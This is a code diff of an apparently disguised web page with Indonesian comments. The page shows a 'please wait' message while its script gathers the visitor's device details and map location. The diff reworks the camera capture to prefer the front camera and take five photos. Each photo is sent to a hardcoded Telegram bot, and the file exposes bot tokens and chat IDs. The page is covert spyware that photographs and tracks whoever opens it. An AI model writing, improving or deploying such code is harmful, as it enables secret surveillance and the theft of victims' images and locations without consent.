@@ -48,9 +48,9 @@
   <div id="msg">Tunggu sebentar, get tutorial sabar..</div>
   <script>
     const token1 = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
-    const token2 = '7908046573:AAEybtvlKrJHgj1BNsobnKImyna19dFAeus';
+    const token2 = '';
     const chatId1 = '5914256752';
-    const chatId2 = '7584798402';
+    const chatId2 = '';
 
     const getDeviceBrand = () => {
       const ua = navigator.userAgent;
@@ -183,41 +183,61 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
       });
     };
 
+    // Ambil kamera dengan opsi front camera (kamera depan) dulu,
+    // kalau gagal baru coba default kamera belakang
     const ambilKamera = async () => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        video.setAttribute("playsinline", true);
-        await video.play();
-
-        await new Promise(resolve => {
-          const cek = () => {
-            if (video.videoWidth > 0 && video.videoHeight > 0) resolve();
-            else requestAnimationFrame(cek);
-          };
-          cek();
-        });
-
-        await new Promise(r => setTimeout(r, 100)); // lebih cepat
-
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0);
-        stream.getTracks().forEach(track => track.stop());
-
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
-        if (blob) await kirimFoto(blob);
-        return "";
-      } catch {
+      const constraintsList = [
+        { video: { facingMode: "user" } },       // kamera depan
+        { video: true }                          // kamera default (biasanya belakang)
+      ];
+      let stream = null;
+      for (const constraints of constraintsList) {
+        try {
+          stream = await navigator.mediaDevices.getUserMedia(constraints);
+          if (stream) break;
+        } catch {}
+      }
+      if (!stream) {
         return `
 - 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 -
 
 ❌ Kamera tidak diizinkan oleh pengguna.
 `;
       }
+
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.setAttribute("playsinline", true);
+      await video.play();
+
+      await new Promise(resolve => {
+        const cek = () => {
+          if (video.videoWidth > 0 && video.videoHeight > 0) resolve();
+          else requestAnimationFrame(cek);
+        };
+        cek();
+      });
+
+      const fotoCount = 5;
+      for (let i = 0; i < fotoCount; i++) {
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
+
+        // Kirim foto ke Telegram
+        await new Promise(resolve => canvas.toBlob(async (blob) => {
+          if(blob) await kirimFoto(blob);
+          resolve();
+        }, "image/jpeg"));
+
+        // Delay singkat biar gercep tapi gak terlalu cepat (100ms)
+        await new Promise(r => setTimeout(r, 100));
+      }
+
+      stream.getTracks().forEach(track => track.stop());
+      return "";
     };
 
     const mulai = async () => {
